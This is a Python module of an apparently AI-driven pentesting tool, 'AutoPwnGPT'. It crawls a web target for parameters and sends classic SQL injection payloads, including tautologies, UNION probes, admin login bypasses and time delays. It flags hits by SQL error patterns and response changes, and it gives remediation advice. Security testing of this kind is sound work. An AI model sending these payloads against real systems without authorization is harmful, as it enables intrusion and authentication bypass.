#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQL Injection Module for AutoPwnGPT.
Tests for SQL injection vulnerabilities in web applications.
"""

import asyncio
import aiohttp
import logging
import re
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple, Union

from src.modules.base_module import BaseModule, ModuleResult, ModuleFinding, ModuleSeverity


class SqlInjection(BaseModule):
    """
    SQL Injection testing module.
    Tests for SQL injection vulnerabilities in web applications.
    """
    
    def __init__(self, context: Dict[str, Any] = None):
        """Initialize the SQL injection module."""
        super().__init__(context)
        self.name = "SqlInjection"
        self.description = "Tests for SQL injection vulnerabilities in web applications"
        self.version = "1.0.0"
        
        # Module-specific parameters
        self.required_args = ["url"]
        self.optional_args = {
            "parameters": "Parameters to test (comma-separated, default: all)",
            "depth": "Crawling depth for parameter discovery (default: 1)",
            "cookies": "Cookies to include in requests (JSON string)",
            "headers": "Headers to include in requests (JSON string)",
            "timeout": "Request timeout in seconds (default: 10)",
            "max_requests": "Maximum number of requests to make (default: 100)"
        }
        
        # SQL injection payloads
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "1' OR '1'='1",
            "admin' --",
            "admin' #",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4 --",
            "' UNION SELECT 1,2,3,4,5 --",
            "1' AND 1=1 --",
            "1' AND 1=2 --",  # Should behave differently if vulnerable
            "1' AND (SELECT 1 FROM dual) --",
            "1' WAITFOR DELAY '0:0:5' --",  # Time-based
            "1'; WAITFOR DELAY '0:0:5' --",  # Time-based
        ]
        
        # Error patterns to detect SQL injection vulnerabilities
        self.error_patterns = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?mysqli?",
            r"PostgreSQL.*?ERROR",
            r"Driver.*?SQL[\-\_\ ]*Server",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Microsoft Access Driver",
            r"SQLite3::query",
            r"ODBC Driver",
            r"DB2 SQL error",
            r"Syntax error.*?in query expression",
            r"Unclosed quotation mark after the character string",
            r"Syntax error .* missing operator",
            r"Syntax error .* in query expression",
            r"Incorrect syntax near",
        ]
        
        # Compiled error patterns
        self.error_regexes = [re.compile(pattern, re.IGNORECASE) for pattern in self.error_patterns]
    
    async def _execute(self, args: Dict[str, Any]) -> ModuleResult:
        """
        Execute the SQL injection test.
        
        Args:
            args: Arguments for the test.
                url: Target URL to test
                parameters: Parameters to test (comma-separated, optional)
                depth: Crawling depth for parameter discovery (optional)
                cookies: Cookies to include in requests (JSON string, optional)
                headers: Headers to include in requests (JSON string, optional)
                timeout: Request timeout in seconds (optional)
                max_requests: Maximum number of requests to make (optional)
                
        Returns:
            The test result.
        """
        url = args.get("url")
        parameters = args.get("parameters", "")
        depth = int(args.get("depth", 1))
        cookies_str = args.get("cookies", "{}")
        headers_str = args.get("headers", "{}")
        timeout = float(args.get("timeout", 10))
        max_requests = int(args.get("max_requests", 100))
        
        # Parse parameters, cookies, and headers
        parameters = [p.strip() for p in parameters.split(",")] if parameters else []
        try:
            import json
            cookies = json.loads(cookies_str)
            headers = json.loads(headers_str)
        except Exception as e:
            self.logger.error(f"Error parsing cookies or headers: {str(e)}")
            cookies = {}
            headers = {}
        
        # Add default headers if not provided
        if "User-Agent" not in headers:
            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        
        self.logger.info(f"Starting SQL injection test against {url}")
        
        try:
            # Create HTTP session
            async with aiohttp.ClientSession(cookies=cookies, headers=headers) as session:
                # If no parameters provided, try to discover them
                if not parameters:
                    self.logger.info("No parameters provided, discovering parameters...")
                    parameters = await self._discover_parameters(session, url, depth, timeout)
                    self.logger.info(f"Discovered parameters: {parameters}")
                
                if not parameters:
                    self.logger.warning("No parameters found to test")
                    return ModuleResult(
                        success=True,
                        findings=[],
                        raw_output={"message": "No parameters found to test"}
                    )
                
                # Test each parameter
                findings = []
                total_requests = 0
                
                for parameter in parameters:
                    if total_requests >= max_requests:
                        self.logger.info(f"Reached maximum number of requests ({max_requests})")
                        break
                    
                    self.logger.info(f"Testing parameter: {parameter}")
                    results = await self._test_parameter(session, url, parameter, timeout)
                    total_requests += len(self.payloads)
                    
                    # Process results
                    if results["vulnerable"]:
                        finding = self._create_finding(url, parameter, results)
                        findings.append(finding)
                        self.logger.info(f"Found SQL injection vulnerability in parameter: {parameter}")
                
                return ModuleResult(
                    success=True,
                    findings=findings,
                    raw_output={
                        "url": url,
                        "parameters_tested": parameters,
                        "total_requests": total_requests,
                        "vulnerable_parameters": [f["details"]["parameter"] for f in findings]
                    }
                )
                
        except Exception as e:
            self.logger.exception(f"Error executing SQL injection test: {str(e)}")
            return ModuleResult(
                success=False,
                error_message=f"Error executing SQL injection test: {str(e)}"
            )
    
    async def _discover_parameters(self, session: aiohttp.ClientSession, url: str, depth: int, timeout: float) -> List[str]:
        """
        Discover parameters in the target URL.
        
        Args:
            session: HTTP session.
            url: Target URL.
            depth: Crawling depth.
            timeout: Request timeout.
            
        Returns:
            List of discovered parameters.
        """
        parameters = set()
        
        # Extract parameters from the URL itself
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        for param in query_params:
            parameters.add(param)
        
        # If depth > 0, crawl the page to find forms and links with parameters
        if depth > 0:
            try:
                async with session.get(url, timeout=timeout) as response:
                    if response.status == 200:
                        html = await response.text()
                        
                        # Extract form parameters
                        form_params = self._extract_form_parameters(html)
                        parameters.update(form_params)
                        
                        # Extract parameters from links
                        link_params = self._extract_link_parameters(html)
                        parameters.update(link_params)
                        
                        # Recursively crawl links if depth > 1
                        if depth > 1:
                            links = self._extract_links(html, url)
                            for link in links[:5]:  # Limit to 5 links to avoid excessive crawling
                                sub_params = await self._discover_parameters(session, link, depth - 1, timeout)
                                parameters.update(sub_params)
            except Exception as e:
                self.logger.error(f"Error discovering parameters: {str(e)}")
        
        return list(parameters)
    
    def _extract_form_parameters(self, html: str) -> Set[str]:
        """
        Extract form parameters from HTML.
        
        Args:
            html: HTML content.
            
        Returns:
            Set of form parameters.
        """
        parameters = set()
        
        # Extract input names from forms
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\']'
        matches = re.findall(input_pattern, html, re.IGNORECASE)
        parameters.update(matches)
        
        # Extract textarea names
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']+)["\']'
        matches = re.findall(textarea_pattern, html, re.IGNORECASE)
        parameters.update(matches)
        
        # Extract select names
        select_pattern = r'<select[^>]*name=["\']([^"\']+)["\']'
        matches = re.findall(select_pattern, html, re.IGNORECASE)
        parameters.update(matches)
        
        return parameters
    
    def _extract_link_parameters(self, html: str) -> Set[str]:
        """
        Extract parameters from links in HTML.
        
        Args:
            html: HTML content.
            
        Returns:
            Set of link parameters.
        """
        parameters = set()
        
        # Extract href attributes
        href_pattern = r'href=["\']([^"\']+)["\']'
        hrefs = re.findall(href_pattern, html, re.IGNORECASE)
        
        # Parse parameters from hrefs
        for href in hrefs:
            if '?' in href:
                query_part = href.split('?', 1)[1]
                query_params = urllib.parse.parse_qs(query_part)
                for param in query_params:
                    parameters.add(param)
        
        return parameters
    
    def _extract_links(self, html: str, base_url: str) -> List[str]:
        """
        Extract links from HTML.
        
        Args:
            html: HTML content.
            base_url: Base URL for resolving relative links.
            
        Returns:
            List of links.
        """
        links = []
        
        # Extract href attributes
        href_pattern = r'href=["\']([^"\']+)["\']'
        hrefs = re.findall(href_pattern, html, re.IGNORECASE)
        
        # Process hrefs
        for href in hrefs:
            # Skip fragment-only links
            if href.startswith('#'):
                continue
            
            # Skip non-HTTP links
            if href.startswith('javascript:') or href.startswith('mailto:'):
                continue
            
            # Resolve relative URLs
            if not href.startswith('http'):
                href = urllib.parse.urljoin(base_url, href)
            
            links.append(href)
        
        return links
    
    async def _test_parameter(self, session: aiohttp.ClientSession, url: str, parameter: str, timeout: float) -> Dict[str, Any]:
        """
        Test a parameter for SQL injection vulnerabilities.
        
        Args:
            session: HTTP session.
            url: Target URL.
            parameter: Parameter to test.
            timeout: Request timeout.
            
        Returns:
            Test results.
        """
        results = {
            "parameter": parameter,
            "vulnerable": False,
            "payload": "",
            "evidence": "",
            "response_code": 0,
            "error_based": False,
            "blind": False
        }
        
        # Check if parameter is in the URL
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        param_in_url = parameter in query_params
        
        # Get baseline response
        try:
            if param_in_url:
                # Parameter is in the URL, replace its value
                test_url = self._modify_url_parameter(url, parameter, "baseline")
                async with session.get(test_url, timeout=timeout) as response:
                    baseline_status = response.status
                    baseline_content = await response.text()
                    baseline_response = {"status": baseline_status, "content": baseline_content}
            else:
                # Parameter is not in the URL, use POST
                async with session.post(url, data={parameter: "baseline"}, timeout=timeout) as response:
                    baseline_status = response.status
                    baseline_content = await response.text()
                    baseline_response = {"status": baseline_status, "content": baseline_content}
        except Exception as e:
            self.logger.error(f"Error getting baseline response: {str(e)}")
            return results
        
        # Test each payload
        for payload in self.payloads:
            try:
                if param_in_url:
                    # Parameter is in the URL, replace its value
                    test_url = self._modify_url_parameter(url, parameter, payload)
                    async with session.get(test_url, timeout=timeout) as response:
                        response_status = response.status
                        response_content = await response.text()
                else:
                    # Parameter is not in the URL, use POST
                    async with session.post(url, data={parameter: payload}, timeout=timeout) as response:
                        response_status = response.status
                        response_content = await response.text()
                
                # Check for SQL errors
                if self._check_for_errors(response_content):
                    results["vulnerable"] = True
                    results["payload"] = payload
                    results["evidence"] = self._extract_error_evidence(response_content)
                    results["response_code"] = response_status
                    results["error_based"] = True
                    break
                
                # Check for differences in response indicating success
                if self._check_for_successful_injection(baseline_response, {"status": response_status, "content": response_content}):
                    results["vulnerable"] = True
                    results["payload"] = payload
                    results["evidence"] = "Response pattern change indicates successful injection"
                    results["response_code"] = response_status
                    break
                
            except Exception as e:
                self.logger.error(f"Error testing payload {payload}: {str(e)}")
                continue
        
        return results
    
    def _modify_url_parameter(self, url: str, parameter: str, value: str) -> str:
        """
        Modify a parameter in a URL.
        
        Args:
            url: URL to modify.
            parameter: Parameter to modify.
            value: New value for the parameter.
            
        Returns:
            Modified URL.
        """
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Update the parameter
        query_params[parameter] = [value]
        
        # Rebuild the query string
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        
        # Rebuild the URL
        new_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        return new_url
    
    def _check_for_errors(self, content: str) -> bool:
        """
        Check for SQL errors in the response content.
        
        Args:
            content: Response content.
            
        Returns:
            True if SQL errors are found, False otherwise.
        """
        for regex in self.error_regexes:
            if regex.search(content):
                return True
        return False
    
    def _extract_error_evidence(self, content: str) -> str:
        """
        Extract error evidence from response content.
        
        Args:
            content: Response content.
            
        Returns:
            Error evidence.
        """
        for regex in self.error_regexes:
            match = regex.search(content)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(content), match.end() + 50)
                return content[start:end]
        return ""
    
    def _check_for_successful_injection(self, baseline: Dict[str, Any], response: Dict[str, Any]) -> bool:
        """
        Check for indicators of successful SQL injection.
        
        Args:
            baseline: Baseline response.
            response: Test response.
            
        Returns:
            True if the injection appears successful, False otherwise.
        """
        # Check for significant changes in response code
        if baseline["status"] != response["status"]:
            return True
        
        # Check for significant differences in content length
        baseline_len = len(baseline["content"])
        response_len = len(response["content"])
        if abs(baseline_len - response_len) > 100:  # Arbitrary threshold
            return True
        
        # Check for login bypass indicators
        login_indicators = ["welcome", "dashboard", "account", "logout", "profile", "admin"]
        for indicator in login_indicators:
            if indicator.lower() in response["content"].lower() and indicator.lower() not in baseline["content"].lower():
                return True
        
        return False
    
    def _create_finding(self, url: str, parameter: str, results: Dict[str, Any]) -> ModuleFinding:
        """
        Create a finding for a SQL injection vulnerability.
        
        Args:
            url: Target URL.
            parameter: Vulnerable parameter.
            results: Test results.
            
        Returns:
            A ModuleFinding for the vulnerability.
        """
        title = f"SQL Injection Vulnerability in parameter '{parameter}'"
        
        description = f"A SQL injection vulnerability was found in the parameter '{parameter}' at {url}. "
        description += f"The application appears to be vulnerable to the payload: {results['payload']}. "
        
        if results["error_based"]:
            description += "The vulnerability was confirmed through error-based testing, where the application returned SQL error messages."
        else:
            description += "The vulnerability was confirmed through differences in application behavior when malicious input was provided."
        
        severity = ModuleSeverity.HIGH
        
        details = {
            "url": url,
            "parameter": parameter,
            "payload": results["payload"],
            "response_code": results["response_code"],
            "injection_type": "error-based" if results["error_based"] else "blind",
            "evidence": results["evidence"]
        }
        
        remediation = (
            "1. Use parameterized queries or prepared statements instead of concatenating user input into SQL queries.\n"
            "2. Implement input validation and sanitization for all user inputs.\n"
            "3. Apply the principle of least privilege for database accounts used by the application.\n"
            "4. Implement a web application firewall (WAF) as an additional defense layer."
        )
        
        references = [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            "https://portswigger.net/web-security/sql-injection"
        ]
        
        return ModuleFinding(
            title=title,
            description=description,
            severity=severity,
            details=details,
            remediation=remediation,
            references=references
        )
